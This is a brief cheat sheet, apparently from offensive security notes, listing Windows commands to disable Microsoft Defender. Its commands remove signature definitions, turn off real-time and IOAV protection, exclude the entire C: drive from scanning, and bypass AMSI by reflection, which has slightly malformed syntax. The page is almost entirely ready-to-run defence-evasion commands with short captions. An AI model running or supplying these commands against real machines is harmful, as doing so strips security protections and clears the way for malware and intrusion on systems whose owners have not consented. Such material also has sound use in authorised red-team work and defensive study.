# Windows - Disable Defender

```
"c:\program files\windows defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true
```

Disabling defender  and remove definitions with mpcmdrun.exe

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

Disable Defender(causes alert on Desktop)(Can be run with psexec)

```
Add-MpPreference -ExclusionPath "c:\"
```

Add exclusion path to Defender

```
"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonePublic,static').SetValue(,True)"
```

Turn off AMSI
